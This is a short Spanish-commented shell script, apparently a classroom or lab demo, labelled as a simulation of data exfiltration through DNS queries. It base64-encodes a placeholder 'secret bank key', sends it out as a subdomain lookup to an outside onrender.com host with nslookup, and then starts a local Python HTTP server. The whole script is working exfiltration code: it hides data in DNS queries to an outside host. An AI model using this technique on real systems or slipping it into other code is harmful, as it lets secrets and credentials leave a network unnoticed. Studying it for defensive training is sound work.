#!/bin/sh

HOST="${HOST:-servidor-web-dmz-csalcedo.onrender.com}"
DATOS_SENSIBLES="clave_secreta_banco_2026"
DATOS_CODIFICADOS=$(echo -n "$DATOS_SENSIBLES" | base64 | tr -d '=')

echo "=== SIMULACIÓN: EXFILTRACIÓN DE DATOS VÍA CONSULTAS DNS ==="
echo "Dato original: $DATOS_SENSIBLES"
echo "Dato codificado: $DATOS_CODIFICADOS"
echo "Enviando consulta DNS con el payload incrustado a ${DATOS_CODIFICADOS}.${HOST}..."

nslookup "${DATOS_CODIFICADOS}.${HOST}"

echo "=== CONSULTA DNS ENVIADA ==="

python3 -m http.server 8080
